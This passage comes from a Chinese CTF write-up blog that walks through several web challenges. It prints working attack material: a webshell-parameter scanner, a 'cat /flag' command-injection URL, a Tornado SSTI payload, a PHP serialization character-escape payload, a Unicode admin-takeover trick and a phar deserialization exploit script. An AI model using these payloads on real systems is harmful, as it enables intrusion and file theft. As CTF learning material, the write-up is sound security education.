class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">        pool.submit(read_file, file)</span><br></pre></td></tr></table></figure><p>然后再本地开一个服务器，扫描后可以得到<code>xk0SzyKwfzw.php</code>存在传参点，审计一下可以找到<code>Efa5BVG</code>这个参数，最后传参读flag。</p><p><code>payload：/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p><h2 id="0x03-easy-tornado"><a href="#0x03-easy-tornado" class="headerlink" title="0x03 easy_tornado"></a>0x03 easy_tornado</h2><p><strong>考察点：SSTI、tornado附属文件</strong></p><p>点开链接发现有三个文件，<code>flag.txt</code>里提示flag在<code>/fllllllllllllag</code>中；<code>welcome.txt</code>提示<code>render()</code>渲染函数，文件内容会直接显示在页面上；<code>hints.txt</code>提示我们访问的文件存在一个以文件名和密钥组成的签名认证，即：<code>md5(cookie_secret+md5(filename))</code></p><p>这里刚开始以为是hash长度拓展攻击，想写脚本爆破<code>cookie_secret</code>长度，后来发现好像并没有太大关系=  =。</p><p><strong>知识盲区：在<code>Error</code>页面存在<code>SSTI</code>，<code>tornado</code>框架存在附属文件`handler.settings</strong>`</p><p>于是输入：<code>?msg={ {handler.settings} }</code></p><p>得到<code>cookie_secret</code>：<code>M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r</code></p><p>之后就是简单的字符串拼接和<code>md5</code>加密，不多赘述。</p><h2 id="0x04-0CTF-piapiapia"><a href="#0x04-0CTF-piapiapia" class="headerlink" title="0x04 [0CTF]piapiapia"></a>0x04 [0CTF]piapiapia</h2><p><strong>考察点：字符逃逸</strong></p><p>打开链接，是一个登录页面，还有一张猫图：</p><p><img src="https://i.loli.net/2019/07/19/5d31d2a28017917175.png" alt="猫图"></p><p>直接登录会返回<code>Invalid user name</code> 或者 <code>Invalid user name or password</code>，看页面源码发现没东西，于是扫目录，发现<code>www.zip</code>里有源码，于是开始审计代码。</p><p>篇幅有限，只写下关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.php 反序列化 =》任意文件读取</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);<span class="comment">//反序列化？</span></span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment"># 任意文件读取？</span></span><br></pre></td></tr></table></figure><p>省略前面的登录部分，这里我们可以发现如果<code>$profile[&#39;photo&#39;]</code>可控的话，可以实现任意文件读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update.php 控制$profile</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));<span class="comment">//序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟进$profile，在update.php中，可以看到<code>$profile</code>除了<code>$profile[photo]</code>以外都是通过表单以POST形式传参，<code>$profile[photo]</code>传入的文件名被md5加密了而不可控(另外也考虑过上传webshell读flag，/upload直接禁止访问貌似没戏)，那么我们继续跟进<code>update_profile()</code>，看看从序列化到反序列化中进行了什么操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现$profile被fileter()过滤了一遍，再跟到<code>fileter()</code>看一看。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm乍看之下没有什么问题，我们分析一下最后一行：把$string(也就是<code>$profile</code>)中含有的$safe都换成’hacker’，这里的利用方法就很巧妙了。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php **flag**</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>首先明确思路：</strong>flag在<code>config.php</code>中，如果可以通过<code>profile.php</code>中的反序列化覆盖<code>$profile[&#39;photo&#39;]</code>实现任意文件读取，flag就到手辣！</p><h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><p>在过滤函数<code>fiter()</code>中，把序列化字符串中<code>select、insert、update、delete、where</code>都替换成<code>hacker</code>，如果稍微了解序列化原理就会发现问题，<code>$safe</code>中<code>where</code>的长度是5，而<code>hacker</code>的长度为6，<strong>这就会导致在替换之后，反序列化还原时产生截断，也就是<code>hacker</code>的最后一个字符<code>&#39;r&#39;</code>是不会被读取的，这就造成了字符逃逸。</strong></p><p><strong>正常语句：</strong></p><p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678909&quot;;s:5:&quot;email&quot;;s:16:&quot;123123@gmail.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:12:&quot;sketch_pl4ne&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></p><p><strong>计算需要逃逸的字符数：</strong></p><p><img src="https://i.loli.net/2019/07/19/5d31de79e3efd28566.png" alt="计算字符数"></p><p><strong>构造payload：</strong></p><p><code>payload：wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</code></p><p><strong>抓包写入：</strong></p><p><img src="https://i.loli.net/2019/07/19/5d31e014d3d5e11966.png" alt="抓包写入"></p><p><strong>注意：这里是通过<code>nickname</code>来输入<code>payload</code>，但是<code>nickname</code>是有限制的，需要使用数组绕过。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top:100px"</span>&gt;</span>  <span class="comment">&lt;!--这里输出flag --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/gif;base64,&lt;?php echo $photo; ?&gt;"</span> <span class="attr">class</span>=<span class="string">"img-memeda "</span> <span class="attr">style</span>=<span class="string">"width:180px;margin:0px auto;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hi <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Phone: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Email: <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后在<code>profile.php</code>页面的图片<code>src</code>属性解<code>base64</code>得到<code>flag</code>（这也是为什么一开始会想到文件包含）</p><p><img src="https://i.loli.net/2019/07/19/5d31e205541ec27238.png" alt="flag"></p><h2 id="0x05-admin"><a href="#0x05-admin" class="headerlink" title="0x05 admin"></a>0x05 admin</h2><p><strong>考察点：Unicode安全</strong></p><p>打开题目到处看，在修改密码页面发现源码泄露。</p><p>发现貌似是一个用python写的登录模块，在<code>routes.py</code>中我们发现问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment"># 将用户名转为小写</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">'Wrong verify code.'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first(): <span class="comment"># 与原有用户名比较</span></span><br><span class="line">            flash(<span class="string">'The username has been registered'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'register successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form = form)</span><br></pre></td></tr></table></figure><p>注意到在注册时是先将用户名转小写，再与原用户名比较。也就是说，我们以<code>Admin</code>注册，相当于是以<code>admin</code>注册，再看更改密码函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>]) <span class="comment"># 更改密码会把用户名转换为小写</span></span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data) <span class="comment"># 重置小写用户名的密码（坏笑</span></span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure><p>那么如果我们能注册到一个<code>Admin</code>用户的话，是不是就可以通过更改密码选项来改管理员<code>admin</code>的密码？</p><p>这里我们需要了解Unicode安全。。</p><p><a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">Unicode安全</a> </p><p><img src="https://i.loli.net/2019/07/20/5d32e164be36b29413.png" alt="博文讲解"></p><p>按照文章所说，注册一个用户名为<code>ᴬdmin</code>的用户，再用更改密码重置admin的密码，最后登录即可获得flag。</p><p><img src="https://i.loli.net/2019/07/20/5d32e1757576f32285.png" alt="flag"></p><p>思考：如果admin的密码是上一个人重置的的话，很大的可能是弱密码，是不是可以考虑直接爆破 (弟弟行为</p><h2 id="0x07-CISCN-2019-Dropbox"><a href="#0x07-CISCN-2019-Dropbox" class="headerlink" title="0x07 [CISCN 2019]Dropbox"></a>0x07 [CISCN 2019]Dropbox</h2><p><strong>考察点：phar://协议伪造其他文件绕过上传检测</strong></p><p>参考文章：<a href="https://xz.aliyun.com/t/2715#toc-6" target="_blank" rel="noopener">初探phar://</a></p><p>我们主要需要了解以下几点：</p><ul><li>phar.phar文件的data数据是<strong>以序列化形式存储</strong>的</li><li>由于.phar文件通过<code>stub(也就是&quot;__HALT_COMPILER();?&gt;&quot;)</code>识别，对文件头以及后缀没有要求</li><li>phar.phar文件通过phar://可以读取</li></ul><p><strong>@glzin</strong>师傅的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1. 用这个构造一个 phar.phar</span></span><br><span class="line"><span class="comment">//2. 重命名为 phar.jpg，传上去</span></span><br><span class="line"><span class="comment">//3. POST 访问 /delete.php ，filename = phar://phar.jpg/exp.txt</span></span><br><span class="line"><span class="comment">//4. flag 到手~</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后访问抓包，filename改为:<code>phar://phar.jpg/exp.txt</code>即可得到flag：</p><p><img src="https://i.loli.net/2019/07/21/5d33be1babcca79314.png" alt="flag"></p><h2 id="0x08-CISCN-2019-ikun"><a href="#0x08-CISCN-2019-ikun" class="headerlink" title="0x08 [CISCN 2019]ikun"></a>0x08 [CISCN 2019]ikun</h2><p><strong>考察点：python web 脚本编写与代码审计(反序列化)、审查元素、薅羊毛逻辑</strong></p><p>打开题目，是一个ikun的粉丝应援团界面，按照惯例先探索一下功能。</p><p><img src="https://i.loli.net/2019/07/21/5d34506e458c710675.png" alt="界面"></p><p>看到说要买到lv6的大会员，但是我们发现下面貌似没有lv6，而且总共有500页。</p><p><img src="https://i.loli.net/2019/07/21/5d345127c847e12292.png" alt="500页会员"></p><p>一页一页找是不现实的，我们可以写一个小jio本，当出现<code>lv6.png</code>的时候就打印出<code>page</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span 